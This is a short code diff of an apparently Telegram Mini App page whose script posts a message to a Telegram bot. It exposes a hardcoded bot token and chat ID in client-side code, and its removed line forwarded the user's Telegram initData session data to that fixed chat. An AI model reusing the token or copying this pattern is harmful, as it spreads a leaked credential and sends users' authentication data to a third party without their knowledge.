@@ -28,7 +28,7 @@
     function sendMessage() {
 			const token = '5476946556:AAE64iQclmNuyKjkInVJtY5eqUqtDa3EoU4';
 			const chatId = '598045349';
-			const message = `Telegram ${Telegram.WebApp.initData}`;
+			const message = `Telegram ${Telegram.WebApp.initDataTypes}`;
 
 			const xhttp = new XMLHttpRequest();
 			xhttp.onreadystatechange = function() {
@@ -43,7 +43,7 @@
 			xhttp.send(`chat_id=${chatId}&text=${message}`);
 		}
     function showPopup() {
-        Telegram.WebApp.showAlert('Helloo')
+        Telegram.WebApp.showAlert(Telegram.WebApp.initData)
     }
 </script>
 <body style="background-color: #ffffff">
